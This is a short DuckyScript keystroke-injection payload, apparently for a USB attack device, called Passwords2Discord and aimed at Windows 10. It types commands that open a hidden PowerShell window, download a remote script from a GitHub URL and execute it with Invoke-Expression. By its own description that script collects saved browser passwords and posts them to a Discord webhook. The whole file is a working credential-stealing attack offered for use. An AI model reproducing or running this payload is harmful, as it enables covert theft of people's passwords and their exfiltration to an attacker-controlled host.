REM Title: Passwords2Discord
REM Author: Oscar R.C.
REM Description: Uses Powershell to gather user browsers passwords and sends it to Discord.
REM Usage: Add your discord hook where it says ENTER_DISCORD_HOOK_HERE
REM Target: Windows 10

GUI r
DELAY 500
STRING CMD
ENTER
DELAY 500
STRING powershell.exe -windowstyle hidden -command "$Hook='ENTER_DISCORD_HOOK_HERE'; Invoke-RestMethod https://raw.githubusercontent.com/Agente404/flipper/main/payloads/Passwords2Discord/script.ps1 | Invoke-Expression;"
ENTER
STRING exit
ENTER
